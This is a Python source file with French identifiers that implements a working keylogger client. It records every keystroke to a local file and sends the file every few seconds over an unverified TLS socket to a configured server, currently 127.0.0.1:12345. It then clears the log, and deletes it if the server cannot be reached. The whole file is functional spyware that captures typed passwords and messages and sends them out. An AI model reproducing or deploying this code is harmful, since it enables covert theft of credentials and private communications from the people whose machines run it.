import socket
import ssl
import os
import time
import keyboard

from .Systeme import ArretClient 

IP = '127.0.0.1'
PORT = 12345

def SuppressionEnregistrementClavier(Fichier):
    try:
        os.remove(Fichier)
        print(f"Le fichier '{Fichier}' a été supprimé avec succès.")
    except FileNotFoundError:
        print(f"Le fichier '{Fichier}' n'existe pas.")
    except PermissionError:
        print(f"Vous n'avez pas la permission de supprimer le fichier '{Fichier}'.")
    except Exception as e:
        print(f"Une erreur s'est produite lors de la suppression du fichier '{Fichier}': {e}")
    
def ViderEnregistrementClavier(Fichier):
    try:
        with open(Fichier, "w"):
            pass 
        print(f"Le fichier '{Fichier}' a été vidé avec succès.")
    except FileNotFoundError:
        print(f"Le fichier '{Fichier}' n'existe pas.")
    except PermissionError:
        print(f"Vous n'avez pas la permission de vider le fichier '{Fichier}'.")
    except Exception as e:
        print(f"Une erreur s'est produite lors de la vidange du fichier '{Fichier}': {e}")

def EnvoiEnregistrementClavier():
    debut_temporisation = time.time()  
    while True:
        time.sleep(4)
        try:
            ClientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            with context.wrap_socket(ClientSocket, server_hostname=IP) as SecureClientSocket:
                SecureClientSocket.connect((IP, PORT))
                print(f"Connecté au serveur {IP}:{PORT}")

                with open("EnregistrementClavier.txt", "rb") as file:
                    data = file.read()
                    SecureClientSocket.sendall(data)
                    print("Données envoyées au serveur.")
                    ViderEnregistrementClavier("EnregistrementClavier.txt")

                    debut_temporisation = time.time() 

        except KeyboardInterrupt:
            print("Arrêt du client.")
            break  
        except Exception as e:
            if time.time() - debut_temporisation > 1000:
                print("Impossible de joindre le serveur. Arrêt du client.")
                SuppressionEnregistrementClavier("EnregistrementClavier.txt")
                ArretClient()
                break  

            print(f"Erreur lors de la connexion au serveur : {e}")

        finally:
            ClientSocket.close()


def EnregistreurClavier():
    while True:
        Event = keyboard.read_event(suppress=True)
        if Event.event_type == keyboard.KEY_DOWN: 
            Caractere = ''
            if Event.name == 'space':
                Caractere = ' '
            elif Event.name == 'enter':
                Caractere = '\n'
            elif Event.name == 'tab':
                Caractere = '    '
            elif Event.name == 'backspace':
                with open("EnregistrementClavier.txt", "r+") as fichier:
                    contenu = fichier.read()
                    fichier.seek(0, os.SEEK_END)  
                    if len(contenu) > 0:
                        fichier.truncate(fichier.tell() - 1) 
            else:
                if Event.name.startswith('ctrl') or Event.name.startswith('shift'):
                    continue 
                if len(Event.name) > 1:  
                    Caractere = Event.name
                else:
                    Caractere = Event.name
                    if keyboard.is_pressed('shift'):  
                        Caractere = Caractere.upper()

            with open("EnregistrementClavier.txt", "a+") as fichier:
                fichier.write(Caractere)
